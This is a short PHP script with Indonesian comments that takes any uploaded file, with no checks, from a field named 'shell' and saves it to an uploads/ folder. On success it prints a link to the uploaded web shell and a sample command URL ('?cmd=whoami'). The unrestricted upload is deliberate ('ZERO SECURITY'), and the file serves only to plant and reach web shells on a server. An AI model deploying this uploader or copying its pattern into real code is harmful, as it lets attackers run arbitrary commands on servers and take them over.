<?php
// ZERO SECURITY - LANGSUNG MOVE_UPLOADED_FILE
$target_dir = "uploads/";
if(!file_exists($target_dir)) mkdir($target_dir);
$target_file = $target_dir . basename($_FILES["shell"]["name"]);

if(move_uploaded_file($_FILES["shell"]["tmp_name"], $target_file)) {
    echo "SHELL UPLOADED! Akses di: <a href='$target_file'>$target_file</a>";
    echo "<br>Contoh: " . $target_file . "?cmd=whoami";
} else {
    echo "Upload gagal, mungkin server tai?";
}
?>